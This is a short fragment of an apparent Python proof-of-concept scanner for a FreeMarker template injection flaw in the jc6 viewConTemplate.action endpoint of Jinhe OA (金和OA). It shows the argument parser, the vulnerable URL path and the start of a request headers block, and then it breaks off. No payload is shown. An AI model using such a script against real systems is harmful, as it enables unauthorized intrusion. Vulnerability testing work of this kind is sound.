...
def main():
    banner()
    parser = argparse.ArgumentParser(description="金和OA_jc6_viewConTemplate.action存在FreeMarker模板注入漏洞")
...
def poc(target):
    url = target + '/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action'
    headers ={
